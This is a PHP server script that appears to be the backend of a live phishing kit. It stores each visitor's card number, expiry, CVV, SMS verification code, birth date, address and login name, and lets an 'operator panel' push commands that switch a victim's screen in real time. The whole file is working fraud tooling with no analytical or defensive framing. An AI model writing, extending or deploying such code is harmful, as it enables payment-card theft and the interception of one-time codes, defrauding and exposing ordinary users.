<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

$db_file = __DIR__ . '/visitors.json';

// Initialize db file if not exists
if (!file_exists($db_file)) {
    file_put_contents($db_file, json_encode([]));
}

$method = $_SERVER['REQUEST_METHOD'];

if ($method === 'OPTIONS') {
    exit(0);
}

$visitors = json_decode(file_get_contents($db_file), true);
if (!is_array($visitors)) {
    $visitors = [];
}

// Clean up offline visitors (no ping for 10 seconds)
$now = time();
$active_visitors = [];
foreach ($visitors as $id => $v) {
    if (isset($v['last_seen']) && ($now - $v['last_seen'] < 10)) {
        $active_visitors[$id] = $v;
    }
}
$visitors = $active_visitors;

if ($method === 'GET') {
    // Return all visitors to the operator panel
    $all = [];
    foreach ($visitors as $id => $v) {
        $all[] = $v;
    }
    echo json_encode($all);
} elseif ($method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $action = $input['action'] ?? '';

    if ($action === 'ping') {
        $id = $input['id'] ?? '';
        $screen = $input['screen'] ?? 'login-screen';
        $user = $input['user'] ?? '';
        $birthDay = $input['birthDay'] ?? '';
        $birthMonth = $input['birthMonth'] ?? '';
        
        $email = $input['email'] ?? '';
        $phone = $input['phone'] ?? '';
        $address = $input['address'] ?? '';
        $card = $input['card'] ?? '';
        $cardExp = $input['cardExp'] ?? '';
        $cardCvv = $input['cardCvv'] ?? '';
        $smsCode = $input['smsCode'] ?? '';
        
        $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // Simple device detection
        $device = 'PC';
        if (preg_match('/mobile/i', $user_agent)) $device = 'Mobile';
        elseif (preg_match('/tablet/i', $user_agent)) $device = 'Tablet';
        elseif (preg_match('/ipad/i', $user_agent)) $device = 'Tablet';
        
        if ($id) {
            if (!isset($visitors[$id])) {
                $visitors[$id] = [
                    'id' => $id,
                    'ip' => $ip,
                    'device' => $device,
                    'status' => 'online',
                    'command' => '',
                    'screen' => $screen,
                    'user' => $user,
                    'birthDay' => $birthDay,
                    'birthMonth' => $birthMonth,
                    'email' => $email,
                    'phone' => $phone,
                    'address' => $address,
                    'card' => $card,
                    'cardExp' => $cardExp,
                    'cardCvv' => $cardCvv,
                    'smsCode' => $smsCode,
                    'last_seen' => $now
                ];
            } else {
                $visitors[$id]['last_seen'] = $now;
                $visitors[$id]['status'] = 'online';
                $visitors[$id]['screen'] = $screen;
                if ($user !== '') $visitors[$id]['user'] = $user;
                if ($birthDay !== '') $visitors[$id]['birthDay'] = $birthDay;
                if ($birthMonth !== '') $visitors[$id]['birthMonth'] = $birthMonth;
                if ($email !== '') $visitors[$id]['email'] = $email;
                if ($phone !== '') $visitors[$id]['phone'] = $phone;
                if ($address !== '') $visitors[$id]['address'] = $address;
                if ($card !== '') $visitors[$id]['card'] = $card;
                if ($cardExp !== '') $visitors[$id]['cardExp'] = $cardExp;
                if ($cardCvv !== '') $visitors[$id]['cardCvv'] = $cardCvv;
                if ($smsCode !== '') $visitors[$id]['smsCode'] = $smsCode;
            }
            file_put_contents($db_file, json_encode($visitors));
            echo json_encode(['success' => true, 'command' => $visitors[$id]['command']]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Missing ID']);
        }
    } elseif ($action === 'control') {
        $id = $input['id'] ?? '';
        $command = $input['command'] ?? '';
        if ($id && isset($visitors[$id])) {
            $visitors[$id]['command'] = $command;
            file_put_contents($db_file, json_encode($visitors));
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Visitor not found']);
        }
    } elseif ($action === 'clear_command') {
        $id = $input['id'] ?? '';
        if ($id && isset($visitors[$id])) {
            $visitors[$id]['command'] = '';
            file_put_contents($db_file, json_encode($visitors));
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Visitor not found']);
        }
    } elseif ($action === 'clear') {
        file_put_contents($db_file, json_encode([]));
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Unknown action']);
    }
}
